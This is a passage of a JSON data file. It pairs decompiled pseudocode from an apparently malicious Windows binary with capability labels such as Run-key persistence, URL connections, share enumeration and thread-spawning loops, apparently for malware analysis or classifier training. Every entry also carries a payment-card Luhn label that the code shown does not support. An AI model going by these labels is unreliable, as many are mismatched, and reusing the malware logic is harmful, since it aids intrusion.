        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_24h\n\nvoid fcn.00482ed4(void)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t **in_FS_OFFSET;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    uint var_10h;\n    uchar *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = 5;\n    do {\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    var_ch = 0x482eee;\n    fcn.004058ec();\n    var_10h = 0x483007;\n    var_14h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00482ed4::var_14h;\n    var_ch = &stack0xfffffffc;\n    uVar2 = fcn.00406f3c();\n    fcn.00482674(uVar2);\n    piVar1 = var_14h;\n    (**(*var_14h + 0x68))(var_14h);\n    fcn.0040704c();\n    fcn.00406f54();\n    piVar3 = fcn.00406f3c();\n    uVar2 = fcn.00405c48();\n    fcn.00482674(uVar2);\n    (**(*piVar3 + 0x90))();\n    fcn.0040704c();\n    fcn.00405dc8(piVar1);\n    fcn.00482674(uVar2);\n    (**(*piVar3 + 0x44))();\n    fcn.0040704c();\n    fcn.00406f54();\n    fcn.004063bc(0, var_ch, 0x483014, 0xffffffff);\n    *in_FS_OFFSET = piVar3;\n    fcn.00406f3c(0x48300e);\n    fcn.00405c48();\n    fcn.00406f3c();\n    fcn.00405c48();\n    fcn.00406f3c();\n    fcn.00406f3c();\n    fcn.00406f3c();\n    fcn.00406f3c();\n    fcn.00406f3c();\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 598
    },
    "00483020": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_24h\n\nvoid fcn.00483020(void)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t **in_FS_OFFSET;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    uint var_10h;\n    uchar *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = 5;\n    do {\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    var_ch = 0x48303a;\n    fcn.004058ec();\n    var_10h = 0x483153;\n    var_14h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00483020::var_14h;\n    var_ch = &stack0xfffffffc;\n    uVar2 = fcn.00406f3c();\n    fcn.00482674(uVar2);\n    piVar1 = var_14h;\n    (**(*var_14h + 0x68))(var_14h);\n    fcn.0040704c();\n    fcn.00406f54();\n    piVar3 = fcn.00406f3c();\n    uVar2 = fcn.00405c48();\n    fcn.00482674(uVar2);\n    (**(*piVar3 + 0x90))();\n    fcn.0040704c();\n    fcn.00405dc8(piVar1);\n    fcn.00482674(uVar2);\n    (**(*piVar3 + 0x44))();\n    fcn.0040704c();\n    fcn.00406f54();\n    fcn.004063bc(0, var_ch, 0x483160, 0);\n    *in_FS_OFFSET = piVar3;\n    fcn.00406f3c(0x48315a);\n    fcn.00405c48();\n    fcn.00406f3c();\n    fcn.00405c48();\n    fcn.00406f3c();\n    fcn.00406f3c();\n    fcn.00406f3c();\n    fcn.00406f3c();\n    fcn.00406f3c();\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 596
    },
    "00483938": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00483938(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x483951;\n    fcn.004058ec();\n    puStack28 = 0x483959;\n    fcn.004058ec();\n    puStack28 = 0x483961;\n    fcn.004058ec();\n    uStack32 = 0x4839e6;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    fcn.00420b38();\n    fcn.00405894();\n    fcn.00405894();\n    fcn.00420c14();\n    fcn.00420d58();\n    fcn.004211c4();\n    fcn.00404640();\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x4839ed;\n    uStack32 = 0x4839e5;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 267
    },
    "00484140": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00484140(void)\n\n{\n    int32_t *piVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x484159;\n    fcn.004058ec();\n    puStack28 = 0x484161;\n    fcn.004058ec();\n    uStack32 = 0x4841f0;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    fcn.00420b38();\n    piVar1 = fcn.00404610();\n    fcn.00409dd8();\n    fcn.004840f8();\n    fcn.00420c14();\n    fcn.00420d58();\n    fcn.0042124c();\n    (**(*piVar1 + 0x1c))();\n    fcn.00420be4();\n    fcn.00404640();\n    fcn.00404640();\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x4841f7;\n    uStack32 = 0x4841ef;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 302
    },
    "004845e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004845e0(uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x4845f7;\n    fcn.004058ec();\n    puStack24 = 0x4845ff;\n    fcn.004058ec();\n    puStack24 = 0x484607;\n    fcn.004058ec();\n    puStack24 = 0x48460f;\n    fcn.004058ec();\n    uStack28 = 0x4846bb;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack36 = 0x484629;\n    puStack24 = &stack0xfffffffc;\n    var_10h = fcn.00420b38();\n    puStack36 = 0x484634;\n    fcn.00409dd8();\n    puStack36 = 0x484639;\n    fcn.004840f8();\n    uStack40 = 0x484691;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.00420c14();\n    fcn.00420d58();\n    fcn.00409dd8();\n    fcn.00421554();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x484698;\n    uStack40 = 0x484688;\n    fcn.00420be4();\n    uStack40 = 0x484690;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 425
    },
    "004846c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004846c8(uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x4846df;\n    fcn.004058ec();\n    puStack24 = 0x4846e7;\n    fcn.004058ec();\n    puStack24 = 0x4846ef;\n    fcn.004058ec();\n    puStack24 = 0x4846f7;\n    fcn.004058ec();\n    uStack28 = 0x48479c;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack36 = 0x484711;\n    puStack24 = &stack0xfffffffc;\n    var_10h = fcn.00420b38();\n    puStack36 = 0x48471c;\n    fcn.00409dd8();\n    puStack36 = 0x484721;\n    fcn.004840f8();\n    uStack40 = 0x484772;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.00420c14();\n    fcn.00420d58();\n    fcn.004214ac();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x484779;\n    uStack40 = 0x484769;\n    fcn.00420be4();\n    uStack40 = 0x484771;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 419
    },
    "004847ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004847ac(uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x4847c3;\n    fcn.004058ec();\n    puStack24 = 0x4847cb;\n    fcn.004058ec();\n    puStack24 = 0x4847d3;\n    fcn.004058ec();\n    puStack24 = 0x4847db;\n    fcn.004058ec();\n    uStack28 = 0x484880;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack36 = 0x4847f5;\n    puStack24 = &stack0xfffffffc;\n    var_10h = fcn.00420b38();\n    puStack36 = 0x484800;\n    fcn.00409dd8();\n    puStack36 = 0x484805;\n    fcn.004840f8();\n    uStack40 = 0x484856;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.00420c14();\n    fcn.00420d58();\n    fcn.0042147c();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x48485d;\n    uStack40 = 0x48484d;\n    fcn.00420be4();\n    uStack40 = 0x484855;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 421
    },
    "004848a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid fcn.004848a8(void)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t unaff_EBX;\n    int32_t *in_FS_OFFSET;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t iStack76;\n    int32_t iStack72;\n    uchar *var_40h;\n    int32_t var_3ch;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    uint *var_2ch;\n    uint *var_28h;\n    uint *var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_18h = &stack0xfffffffc;\n    iVar2 = 8;\n    do {\n        var_4h = 0;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    var_1ch = 0x484b08;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.004848a8::var_20h;\n    var_24h = 0x4848cf;\n    var_ch = unaff_EBX;\n    iVar2 = fcn.004032e8();\n    if (iVar2 == 0) {\n        var_4h = 0;\n    }\n    else {\n        var_24h = 0x4848e7;\n        fcn.00403348();\n        var_24h = 0x4848ef;\n        var_4h = fcn.004058fc();\n    }\n    var_24h = 0x4848f9;\n    fcn.0040546c();\n    var_10h = 0;\n    var_14h = 0;\n    var_18h = NULL;\n    var_24h = &fcn.004848a8::var_18h;\n    var_28h = &fcn.004848a8::var_14h;\n    var_2ch = &fcn.004848a8::var_10h;\n    var_30h = 0xffffffff;\n    var_34h = &fcn.004848a8::var_8h;\n    var_38h = 0;\n    var_3ch = var_4h;\n    var_40h = 0x484925;\n    iVar2 = sub.netapi32.dll_NetShareEnum();\n    if (iVar2 == 0) {\n        iVar2 = var_10h;\n        if (0 < var_10h) {\n            do {\n                iStack76 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffb4;\n                iStack72 = var_4h;\n                var_40h = &stack0xfffffffc;\n                iVar1 = sub.netapi32.dll_NetShareGetInfo();\n                if (iVar1 == 0) {\n                    fcn.00405664();\n                    fcn.00405738();\n                    uVar4 = *in_EAX;\n                    uVar6 = 0x484b20;\n                    uVar3 = *(var_ch + 4);\n                    uVar5 = 0;\n                    fcn.00409d58(uVar3);\n                    fcn.00405800(var_24h, uVar3, uVar5, uVar6, uVar4);\n                    fcn.00405664(0x484b20, *in_EAX);\n                    fcn.00405800(var_28h);\n                    uVar4 = *in_EAX;\n                    uVar6 = 0x484b20;\n                    uVar3 = *(var_ch + 0xc);\n                    uVar5 = 0;\n                    fcn.00409d58(uVar3);\n                    fcn.00405800(var_2ch, uVar3, uVar5, uVar6, uVar4);\n                    uVar4 = *in_EAX;\n                    uVar6 = 0x484b20;\n                    uVar3 = *(var_ch + 0x10);\n                    uVar5 = 0;\n                    fcn.00409d58(uVar3);\n                    fcn.00405800(var_30h, uVar3, uVar5, uVar6, uVar4);\n                    uVar4 = *in_EAX;\n                    uVar6 = 0x484b20;\n                    uVar3 = *(var_ch + 0x14);\n                    uVar5 = 0;\n                    fcn.00409d58(uVar3);\n                    fcn.00405800(var_34h, uVar3, uVar5, uVar6, uVar4);\n                    fcn.00405664(0x484b20, *in_EAX);\n                    fcn.00405800(var_38h);\n                    fcn.00405664(0x484b20, *in_EAX);\n                    fcn.00405800(var_3ch);\n                    fcn.00409d58(*(var_ch + 0x20));\n                    iStack72 = 0x484b2c;\n                    fcn.00405800();\n                }\n                iStack76 = var_ch;\n                sub.netapi32.dll_NetApiBufferFree();\n                *in_FS_OFFSET = iStack76;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        var_3ch = var_8h;\n        iStack72 = 0x484aed;\n        sub.netapi32.dll_NetApiBufferFree();\n    }\n    *in_FS_OFFSET = var_3ch;\n    var_34h = 0x484b0f;\n    var_38h = 0x484b07;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 1372
    },
    "00484c94": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00484c94(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack320;\n    uint uStack316;\n    uchar *puStack312;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint pszPath;\n    uint pidl;\n    int32_t *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_14h = NULL;\n    var_10h = 0;\n    puStack312 = 0x484cc9;\n    var_8h = param_2;\n    fcn.004058ec();\n    puStack312 = 0x484cd1;\n    fcn.004058ec();\n    puStack312 = 0x484cd9;\n    fcn.004058ec();\n    uStack316 = 0x484e02;\n    uStack320 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffec0;\n    uVar3 = 0;\n    puStack312 = &stack0xfffffffc;\n    iVar1 = sub.shell32.dll_SHGetSpecialFolderLocation(0, 0x10, &fcn.00484c94::pidl);\n    if (iVar1 == 0) {\n        sub.shell32.dll_SHGetPathFromIDListA(pidl, &fcn.00484c94::pszPath);\n        fcn.0042306c();\n        fcn.00406f80();\n        uVar2 = fcn.004058fc();\n        (**(*var_14h + 0x1c))(var_14h, uVar2);\n        uVar2 = fcn.004058fc();\n        (**(*var_14h + 0x50))(var_14h, uVar2);\n        (**(*var_14h + 0x3c))(var_14h, 5);\n        fcn.004056dc();\n        fcn.00405800(0x484e34, var_8h, 0x484e28, 0);\n        uVar2 = fcn.0040639c(0xffffffff);\n        fcn.00406f80(uVar2);\n        (**(_pe_dos_header + 0x18))(0);\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.00406f3c(0x484e09);\n    fcn.0040546c();\n    fcn.00406f3c();\n    fcn.00406f3c();\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 602
    },
    "00485164": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00485164(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.0041f670();\n    *(in_EAX + 0x30) = 0;\n    *(in_EAX + 0x31) = 0;\n    *(in_EAX + 0x34) = 0;\n    *(in_EAX + 0x38) = 0;\n    *(in_EAX + 0x3c) = 0;\n    *(in_EAX + 0x3e) = 0;\n    *(in_EAX + 0x40) = 0xffffffff;\n    *(in_EAX + 0x44) = 0;\n    *(in_EAX + 0x48) = 0;\n    *(in_EAX + 0x4c) = 0;\n    *(in_EAX + 0x50) = 0;\n    *(in_EAX + 0x54) = 0;\n    *(in_EAX + 0x58) = 0;\n    *(in_EAX + 0x5c) = 0;\n    *(in_EAX + 0x60) = 0;\n    *(in_EAX + 100) = 0;\n    *(in_EAX + 0x68) = 0;\n    *(in_EAX + 0x6c) = 0;\n    fcn.0040f38c();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 416
    },
    "00485398": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00485398(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00485164();\n    *(in_EAX + 0x3c) = 2;\n    *(in_EAX + 0x3e) = 0;\n    fcn.0040546c();\n    fcn.0040546c();\n    fcn.0040546c();\n    fcn.0040546c();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 199
    },
    "004853f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004853f8(ushort *arg_8h)\n\n{\n    ushort uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x485418;\n    fcn.004058ec();\n    puStack28 = 0x485420;\n    fcn.004058ec();\n    uStack32 = 0x48548d;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    *arg_8h = 2;\n    puStack28 = &stack0xfffffffc;\n    fcn.0048549c();\n    uVar2 = fcn.004058fc();\n    uVar2 = sub.wsock32.dll_inet_addr(uVar2);\n    *(arg_8h + 2) = uVar2;\n    uVar2 = fcn.00485574();\n    uVar1 = sub.wsock32.dll_htons();\n    arg_8h[1] = uVar1;\n    *in_FS_OFFSET = uVar2;\n    uStack36 = 0x485494;\n    fcn.0040546c();\n    fcn.0040546c();\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 314
    },
    "0048549c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "resolve DNS"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048549c(uint param_1, char *param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    fcn.0040546c();\n    if (param_2 == NULL) {\n        fcn.004054c0();\n    }\n    else if (*param_2 - 0x30U < 10) {\n        uVar1 = fcn.004058fc();\n        iVar2 = sub.wsock32.dll_inet_addr(uVar1);\n        if (iVar2 != -1) {\n            fcn.004054c0();\n        }\n    }\n    else {\n        uVar1 = fcn.004058fc();\n        iVar2 = sub.wsock32.dll_gethostbyname(uVar1);\n        if (iVar2 != 0) {\n            fcn.0040ae94(param_1);\n        }\n    }\n    return;\n}\n",
        "token_count": 197
    },
    "004855b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get hostname"
        ],
        "decompiled_code": "\nvoid fcn.004855b0(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uchar auStack264 [256];\n    \n    fcn.0040546c();\n    sub.wsock32.dll_gethostname(auStack264, 0x100);\n    iVar1 = (**(*in_EAX + 0x38))();\n    if (iVar1 == 0) {\n        fcn.004056dc();\n    }\n    return;\n}\n",
        "token_count": 104
    },
    "0048564c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0048564c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00485398();\n    *(in_EAX + 0x80) = 0;\n    *(in_EAX + 0x88) = 0;\n    *(in_EAX + 0x8c) = 0;\n    *(in_EAX + 0x90) = 0;\n    *(in_EAX + 0x94) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 208
    },
    "00485988": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00485988 noreturn (uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_1ch = 0;\n    var_4h = 0;\n    uStack52 = 0x485abd;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    fcn.00405664();\n    fcn.00405a48(&var_1ch);\n    fcn.00405964();\n    fcn.004058fc();\n    fcn.00405a48();\n    fcn.004059a4();\n    _var_18h = fcn.0040b63c();\n    if (_var_18h == *0x485ad8) {\n        _var_18h = CONCAT28(0x4020, 0x9502f8ffc0000000);\n    }\n    _var_18h = _var_18h * *0x485adc;\n    do {\n        sub.kernel32.dll_Sleep_1(100);\n        sub.kernel32.dll_CreateThread();\n        _var_18h = _var_18h - *0x485ae0;\n    } while (*0x485ad8 < _var_18h);\n    fcn.0048c190();\n    fcn.00405784();\n    fcn.004938a4();\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread(0);\n}\n",
        "token_count": 418
    },
    "00485b40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create HTTP request",
            "connect to URL"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00485c8d)\n\nvoid __cdecl fcn.00485b40(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint uVar3;\n    uint uVar4;\n    uint uStack1136;\n    uint uStack1132;\n    uchar *puStack1128;\n    uint uStack1124;\n    uint uStack1120;\n    uint uStack1116;\n    uint uStack1112;\n    uint uStack1108;\n    uint uStack1104;\n    uint uStack1100;\n    uchar *puStack1096;\n    uint uStack1092;\n    uint uStack1088;\n    uchar *puStack1084;\n    uint var_428h;\n    uint var_424h;\n    uint var_420h;\n    uint var_41ch;\n    uint var_418h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack1096 = &stack0xfffffffc;\n    puStack1084 = 0x485b7a;\n    fcn.00405f08();\n    uStack1088 = 0x485d08;\n    uStack1092 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffbbc;\n    uStack1100 = 0x485c97;\n    uStack1104 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffbb0;\n    uStack1108 = 0x485ba5;\n    puStack1084 = &stack0xfffffffc;\n    fcn.00408460();\n    uStack1108 = 0x485baf;\n    fcn.00405504();\n    arg_8h_00 = *(arg_8h + 4);\n    uStack1108 = 0x485bd7;\n    fcn.00403ae4();\n    uStack1108 = 0;\n    uStack1112 = 0;\n    uStack1116 = 0;\n    uStack1120 = 0;\n    uStack1124 = 0x485d18;\n    puStack1128 = 0x485be9;\n    uVar1 = sub.wininet.dll_InternetOpenA();\n    uStack1132 = 0x485c7d;\n    uStack1136 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffb90;\n    puStack1128 = &stack0xfffffffc;\n    uVar2 = fcn.004058fc(0, 0, 0, 0);\n    uVar2 = sub.wininet.dll_InternetOpenUrlA(uVar1, uVar2);\n    sub.wininet.dll_InternetCloseHandle();\n    *in_FS_OFFSET = uVar2;\n    sub.wininet.dll_InternetCloseHandle(uVar1, 0x485c84);\n    uVar4 = 0x485d2c;\n    uVar3 = 0;\n    uVar2 = 0x485d5c;\n    uVar1 = 0;\n    fcn.00409d58(arg_8h_00);\n    fcn.00405800(0x485d68, 0, arg_8h_00, uVar1, uVar2, uVar3, uVar4);\n    fcn.004938a4();\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread(0);\n}\n",
        "token_count": 789
    },
    "00485e8c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "persist via Run registry key"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00485e8c(uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uchar uVar1;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    puStack36 = 0x485eab;\n    fcn.004058ec();\n    puStack36 = 0x485eb3;\n    fcn.004058ec();\n    puStack36 = 0x485ebb;\n    fcn.004058ec();\n    puStack36 = 0x485ec3;\n    fcn.004058ec();\n    uStack40 = 0x485fb9;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    uVar1 = 1;\n    uStack52 = 0x485f85;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack36 = &stack0xfffffffc;\n    fcn.00420b7c();\n    fcn.00405894();\n    fcn.00405894();\n    fcn.00405894();\n    if (uVar1) {\n        fcn.00405504();\n    }\n    fcn.00405894();\n    if (uVar1) {\n        fcn.00405504();\n    }\n    fcn.00420c14();\n    fcn.00420d58();\n    fcn.0042147c();\n    fcn.00404640();\n    *in_FS_OFFSET = uStack56;\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x485fc0;\n    uStack40 = 0x485fb0;\n    fcn.00405490();\n    uStack40 = 0x485fb8;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 466
    },
    "004862a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004862a4(void)\n\n{\n    uint32_t arg_ch;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack32 = 0x486367;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack36;\n    fcn.00420b7c();\n    fcn.00420c14();\n    fcn.00420d58();\n    fcn.004214dc();\n    arg_ch = *0x4863c8;\n    arg_8h = &var_8h;\n    fcn.0040f130();\n    fcn.00405784();\n    fcn.0040ee40(arg_8h, arg_ch);\n    fcn.00405504();\n    fcn.0042147c();\n    fcn.00404640();\n    *in_FS_OFFSET = arg_8h;\n    iStack36 = 0x48636e;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 298
    },
    "004866f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
